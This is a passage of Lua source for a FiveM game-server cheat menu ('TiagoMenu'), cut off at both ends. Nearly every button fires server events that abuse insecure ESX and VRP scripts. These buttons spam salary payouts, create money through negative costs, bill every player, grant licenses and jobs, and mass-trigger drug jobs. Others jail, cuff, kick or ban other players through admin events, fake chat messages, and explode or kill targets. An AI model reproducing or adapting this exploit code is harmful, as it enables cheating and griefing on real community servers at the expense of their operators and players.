				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif TiagoMenu.Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif TiagoMenu.Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:withdraw", result)
				end
			end


			TiagoMenu.Display()
				elseif TiagoMenu.IsMenuOpened("ESXMisc") then
				    if TiagoMenu.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
					elseif TiagoMenu.Button("~g~~h~ESX ~w~Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif TiagoMenu.Button("~g~~h~ESX ~w~Get all licenses Drive") then
					TriggerServerEvent("dmv:success")
					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
					TriggerServerEvent('esx_airlines:addLicense', 'helico')
					TriggerServerEvent('esx_airlines:addLicense', 'avion')
                elseif TiagoMenu.Button("~g~~h~ESX ~w~Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
				elseif TiagoMenu.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif TiagoMenu.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("MiscServerOptions") then
				if TiagoMenu.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif TiagoMenu.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("VRPOptions") then
				if TiagoMenu.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif TiagoMenu.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif TiagoMenu.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif TiagoMenu.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif TiagoMenu.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end


				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("ESXDrugs") then
				if TiagoMenu.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				elseif TiagoMenu.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				elseif TiagoMenu.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
				elseif TiagoMenu.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				elseif TiagoMenu.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
				    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
				elseif TiagoMenu.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				elseif TiagoMenu.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				elseif TiagoMenu.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
				elseif TiagoMenu.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				elseif TiagoMenu.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				elseif TiagoMenu.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				elseif TiagoMenu.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				elseif TiagoMenu.Button("~h~~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif TiagoMenu.Button("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					TriggerServerEvent('esx_illegal_drugs:stopHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:stopTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:stopSellCoke')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:stopTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:stopSellMeth')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:stopTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:stopSellWeed')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:stopTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:stopSellOpium')
					drawNotification("~r~Everything is now stopped.")
					elseif TiagoMenu.Button("~h~~g~Sell Money Wash ~s~new") then
					local result = KeyboardInput("Enter amount wash money ", "", 100000)
					if result then
					TriggerServerEvent('esx_moneywash:washMoney', result)
					TriggerServerEvent('esx_blackmoney:washMoney', result)
					end
				end
				
				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and TiagoMenu.MenuButton("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("RecrutarPlayersOptions") then
				TiagoMenu.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if TiagoMenu.Button("~r~Remove job") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(SelectedPlayer))
			    elseif TiagoMenu.Button("~s~Recruit~c~~h~ Mechanic") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('esx_society:getJob', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif TiagoMenu.Button("~s~Recruit~b~~h~ Police") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
			elseif TiagoMenu.Button("~s~Recruit~c~~h~ Mafia") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif TiagoMenu.Button("~s~Recruit~p~~h~ Gang") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif TiagoMenu.Button("~s~Recruit~r~~h~ Inem") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif TiagoMenu.Button("~h~Custom Recruit") then
					local reason = KeyboardInput("Enter the job name", "", 100)
					local reason2 = KeyboardInput("Enter the nivel job number 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), reason, reason2)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(SelectedPlayer), reason, reason2)
					TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(SelectedPlayer), reason, reason2)
					end
				end

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and TiagoMenu.MenuButton("~h~ID: ~r~[ "..GetPlayerServerId(i).." ] ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[ ~g~ALIVE~s~ ]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
		

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("PlayerOptionsMenu") then
				TiagoMenu.SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~r~[" .. GetPlayerName(SelectedPlayer) .. "~r~]")
				if TiagoMenu.Button("~h~~r~[~s~ SPECTATE ~h~~r~]", (Spectating and "~r~[ON]")) then
					SpectatePlayer(SelectedPlayer)
				elseif TiagoMenu.Button("~r~→  ~y~Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                elseif TiagoMenu.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then					
				elseif TiagoMenu.Button("~g~Spam Msg") then
					    local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
					
				elseif TiagoMenu.Button("~g~Give ~s~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif TiagoMenu.Button("~r~Remove ~s~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif TiagoMenu.Button("~r~Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
				elseif TiagoMenu.Button("~g~Revive ~h~~g~ESX") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
					TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
					elseif TiagoMenu.Button('~g~Revive ~h~~b~VRP') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif TiagoMenu.Button('~b~Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif TiagoMenu.Button('~b~FULL Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
			    elseif TiagoMenu.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif TiagoMenu.Button('Fire') then
				    FirePlayer(SelectedPlayer)
				elseif TiagoMenu.Button("~b~Open inventory ~s~new") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif TiagoMenu.Button("Jail") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("esx-qalle-jail:updateJailTime", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "dude weed")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(SelectedPlayer), 45 * 60, "dude weed")
				elseif TiagoMenu.Button("Unjail") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("esx-qalle-jail:unJailPlayer", GetPlayerServerId(SelectedPlayer), 0)				
				elseif TiagoMenu.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
					elseif TiagoMenu.Button("~r~Remove All Weapons") then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
				elseif TiagoMenu.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif TiagoMenu.Button("Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					else
						drawNotification("~r~Model is not valid!")
					end
				elseif TiagoMenu.Button('~h~Clone Car') then
                    ClonePedVeh()
				elseif TiagoMenu.Button("~b~Cuff Player") then
				        TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerPed(SelectedPlayer))
						TriggerServerEvent("CheckHandcuff", GetPlayerPed(SelectedPlayer))
						TriggerServerEvent('cuffServer', GetPlayerPed(SelectedPlayer))
						TriggerServerEvent("cuffGranted", GetPlayerPed(SelectedPlayer))
						TriggerServerEvent("police:cuffGranted", GetPlayerPed(SelectedPlayer))
						TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerPed(SelectedPlayer))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerPed(SelectedPlayer))
				elseif TiagoMenu.Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif TiagoMenu.Button("~r~MelloTrainer ~s~BAN") then
				local result = KeyboardInput("motivo do ban", "", 100)
					if result then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer),result)
					end
				elseif TiagoMenu.Button("~r~MelloTrainer ~s~KICK") then
				local result = KeyboardInput("motivo do kick", "", 100)
					if result then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), result)
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), result)
					end
				end
				
				TiagoMenu.Display()
                elseif TiagoMenu.IsMenuOpened("PlayerTrollMenu") then
				 
                    if TiagoMenu.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
						elseif TiagoMenu.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
				elseif TiagoMenu.Button("Ram w/ Custom Vehicle") then
						local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
                        local model = GetHashKey(ModelName1)
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)		
                        end		
											                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
						end
                   
				elseif TiagoMenu.Button('~y~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif TiagoMenu.Button('~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif TiagoMenu.Button('~r~ISIS Explode') then
